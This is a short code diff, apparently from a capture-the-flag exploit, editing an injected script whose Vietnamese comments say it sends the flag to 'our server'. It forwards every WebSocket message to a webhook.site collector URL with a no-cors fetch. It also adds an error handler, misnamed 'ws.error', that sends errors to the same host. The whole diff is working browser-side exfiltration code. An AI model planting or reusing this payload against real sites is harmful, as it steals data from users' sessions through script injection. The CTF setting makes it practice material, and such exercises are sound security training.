@@ -11,7 +11,11 @@
 
   ws.onmessage = (event) => {
     // Chuyển flag đến server của chúng ta
-    location =
-      "https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?" + event.data;
+    fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?data=" + event.data,{mode: 'no-cors'});
+  };
+  
+  ws.error = (error) => {
+    // Chuyển flag đến server của chúng ta
+    fetch("https://webhook.site/a80c813f-7fdc-4a90-bad0-00ee94384cfd?error=" + error,{mode: 'no-cors'});
   };
 </script>
